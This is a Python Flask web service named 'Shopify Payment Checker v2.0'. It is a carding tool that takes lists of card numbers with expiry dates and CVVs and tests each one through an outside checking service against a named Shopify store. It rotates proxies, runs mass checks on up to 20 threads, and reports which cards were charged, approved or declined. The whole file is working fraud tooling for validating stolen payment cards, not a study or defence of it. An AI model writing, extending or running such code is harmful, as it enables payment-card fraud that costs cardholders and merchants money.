#!/usr/bin/env python3
"""
Shopify Payment Checker v2.0 - Railway Web API
Flask-based web service with token auth
"""

import os
import sys
import re
import json
import time
import random
import requests
from datetime import datetime
from typing import Dict, Optional, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ===== READ TOKEN FROM RAILWAY ENV =====
AUTH_TOKEN = os.environ.get('TOKEN', '')
PORT = int(os.environ.get('PORT', 5000))

# ===== COLORS (for logs) =====
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ===== PROXY MANAGEMENT =====
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.failed_proxies = set()
        
    def load_proxies(self, file_path: str) -> int:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.proxies.append(proxy)
            return len(self.proxies)
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return 0
    
    def add_proxy(self, proxy: str):
        if proxy and proxy not in self.proxies:
            self.proxies.append(proxy)
    
    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        attempts = 0
        while attempts < len(self.proxies):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            
            if proxy in self.failed_proxies:
                attempts += 1
                continue
            
            return proxy
        
        self.failed_proxies.clear()
        if self.proxies:
            return self.proxies[0]
        return None
    
    def mark_failed(self, proxy: str):
        if proxy:
            self.failed_proxies.add(proxy)

# Global proxy manager
proxy_manager = ProxyManager()

def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    card_str = card_str.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_str)
        if match:
            card, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 2:
                year = f"20{year}"
            return card, month, year, cvv
    return None

def mask_card(card: str) -> str:
    if len(card) >= 10:
        return card[:6] + "******" + card[-4:]
    return card

def extract_cards(text: str) -> List[str]:
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            parsed = parse_card(line)
            if parsed:
                card, month, year, cvv = parsed
                cards.append(f"{card}|{month}|{year}|{cvv}")
    return list(dict.fromkeys(cards))

def check_card(card: str, use_proxy: bool = True) -> Dict:
    """Check a single card using Shopify API"""
    try:
        card_number, exp_month, exp_year, cvv = card.split('|')
        
        url = "https://web-production-669be.up.railway.app/shopify"
        
        proxy = None
        if use_proxy:
            proxy = proxy_manager.get_proxy()
        
        params = {
            "site": "https://the3doodler.com/",
            "cc": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        }
        
        if proxy:
            params["proxy"] = proxy
        
        start_time = time.time()
        response = requests.get(url, params=params, timeout=30)
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                status = data.get('Status', False)
                gateway = data.get('Gateway', 'Unknown')
                price = data.get('Price', 'N/A')
                response_msg = data.get('Response', 'Unknown')
                time_taken = data.get('Time', f'{elapsed:.2f}s')
                
                response_lower = str(response_msg).lower()
                
                if status == True:
                    status_type = 'CHARGED'
                elif 'approved' in response_lower:
                    status_type = 'APPROVED'
                elif 'order_placed' in response_lower or 'order_place' in response_lower:
                    status_type = 'ORDER_PLACED'
                elif '3ds' in response_lower or '3d_secure' in response_lower:
                    status_type = '3DS_REQUIRED'
                elif 'declined' in response_lower or 'card_declined' in response_lower:
                    status_type = 'DECLINED'
                else:
                    status_type = 'UNKNOWN'
                
                return {
                    'card': mask_card(card_number),
                    'full_card': card,
                    'status': status_type,
                    'status_bool': status,
                    'gateway': gateway,
                    'price': price,
                    'response': response_msg,
                    'time': time_taken,
                    'proxy': proxy
                }
                
            except json.JSONDecodeError:
                return {
                    'card': mask_card(card_number),
                    'full_card': card,
                    'status': 'ERROR',
                    'status_bool': False,
                    'gateway': 'Unknown',
                    'price': 'N/A',
                    'response': 'Invalid JSON response',
                    'time': f'{elapsed:.2f}s',
                    'proxy': proxy
                }
        else:
            if proxy:
                proxy_manager.mark_failed(proxy)
            return {
                'card': mask_card(card_number),
                'full_card': card,
                'status': 'ERROR',
                'status_bool': False,
                'gateway': 'Unknown',
                'price': 'N/A',
                'response': f'HTTP {response.status_code}',
                'time': f'{elapsed:.2f}s',
                'proxy': proxy
            }
            
    except requests.exceptions.ProxyError:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': mask_card(card.split('|')[0]) if '|' in card else card,
            'full_card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': 'Proxy Error',
            'time': 'N/A',
            'proxy': proxy
        }
    except requests.exceptions.Timeout:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': mask_card(card.split('|')[0]) if '|' in card else card,
            'full_card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': 'Timeout',
            'time': 'N/A',
            'proxy': proxy
        }
    except Exception as e:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': mask_card(card.split('|')[0]) if '|' in card else card,
            'full_card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': str(e)[:50],
            'time': 'N/A',
            'proxy': proxy
        }

# ===== TOKEN AUTH DECORATOR =====
def require_token(f):
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '').strip()
        if not AUTH_TOKEN:
            return jsonify({'error': 'TOKEN not configured on server'}), 500
        if token != AUTH_TOKEN:
            return jsonify({'error': 'Invalid or missing token'}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# ===== API ROUTES =====

@app.route('/')
def home():
    return jsonify({
        'name': 'Shopify Payment Checker v2.0',
        'status': 'running',
        'endpoints': {
            'POST /check': 'Single card check',
            'POST /bulk': 'Multiple cards check',
            'POST /mass': 'Mass check with threads',
            'POST /proxy/load': 'Load proxies from file (server-side)',
            'GET /proxy/list': 'List loaded proxies',
            'POST /proxy/add': 'Add single proxy',
            'DELETE /proxy/clear': 'Clear all proxies'
        },
        'auth': 'Bearer TOKEN in Authorization header'
    })

@app.route('/check', methods=['POST'])
@require_token
def single_check():
    data = request.get_json()
    if not data or 'card' not in data:
        return jsonify({'error': 'Provide card in format: card|mm|yy|cvv'}), 400
    
    card_input = data['card'].strip()
    use_proxy = data.get('use_proxy', False)
    
    parsed = parse_card(card_input)
    if not parsed:
        return jsonify({'error': 'Invalid card format'}), 400
    
    card = f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}"
    result = check_card(card, use_proxy=use_proxy)
    
    return jsonify({
        'success': True,
        'result': result
    })

@app.route('/bulk', methods=['POST'])
@require_token
def bulk_check():
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({'error': 'Provide cards array'}), 400
    
    cards_raw = data['cards']
    use_proxy = data.get('use_proxy', False)
    
    cards = []
    for c in cards_raw:
        parsed = parse_card(c)
        if parsed:
            cards.append(f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}")
    
    if not cards:
        return jsonify({'error': 'No valid cards'}), 400
    
    results = []
    charged = []
    
    for card in cards:
        result = check_card(card, use_proxy=use_proxy)
        results.append(result)
        if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
            charged.append(result)
        time.sleep(0.2)
    
    return jsonify({
        'success': True,
        'total': len(cards),
        'charged': len(charged),
        'results': results
    })

@app.route('/mass', methods=['POST'])
@require_token
def mass_check():
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({'error': 'Provide cards array'}), 400
    
    cards_raw = data['cards']
    use_proxy = data.get('use_proxy', False)
    max_workers = min(data.get('threads', 5), 20)
    
    cards = []
    for c in cards_raw:
        parsed = parse_card(c)
        if parsed:
            cards.append(f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}")
    
    if not cards:
        return jsonify({'error': 'No valid cards'}), 400
    
    results = []
    charged = []
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_card, card, use_proxy): card for card in cards}
        
        for future in as_completed(futures):
            card = futures[future]
            try:
                result = future.result(timeout=60)
                results.append(result)
                if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
                    charged.append(result)
            except Exception as e:
                results.append({
                    'card': mask_card(card.split('|')[0]),
                    'full_card': card,
                    'status': 'ERROR',
                    'response': str(e)[:50]
                })
    
    elapsed = time.time() - start
    
    return jsonify({
        'success': True,
        'total': len(cards),
        'charged': len(charged),
        'time': f'{elapsed:.2f}s',
        'results': results
    })

@app.route('/proxy/load', methods=['POST'])
@require_token
def load_proxies():
    data = request.get_json()
    if not data or 'file_path' not in data:
        return jsonify({'error': 'Provide file_path'}), 400
    
    count = proxy_manager.load_proxies(data['file_path'])
    return jsonify({
        'success': True,
        'loaded': count,
        'total': len(proxy_manager.proxies)
    })

@app.route('/proxy/add', methods=['POST'])
@require_token
def add_proxy():
    data = request.get_json()
    if not data or 'proxy' not in data:
        return jsonify({'error': 'Provide proxy'}), 400
    
    proxy_manager.add_proxy(data['proxy'])
    return jsonify({
        'success': True,
        'total': len(proxy_manager.proxies)
    })

@app.route('/proxy/list', methods=['GET'])
@require_token
def list_proxies():
    return jsonify({
        'success': True,
        'count': len(proxy_manager.proxies),
        'proxies': proxy_manager.proxies
    })

@app.route('/proxy/clear', methods=['DELETE'])
@require_token
def clear_proxies():
    proxy_manager.proxies.clear()
    proxy_manager.failed_proxies.clear()
    proxy_manager.current_index = 0
    return jsonify({
        'success': True,
        'message': 'All proxies cleared'
    })

# ===== MAIN =====
if __name__ == "__main__":
    print(f"{CYAN}Shopify Payment Checker v2.0 - Railway Mode{RESET}")
    print(f"{GREEN}Auth Token: {'Set' if AUTH_TOKEN else 'NOT SET - Add TOKEN env var!'}{RESET}")
    print(f"{YELLOW}Starting server on port {PORT}...{RESET}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
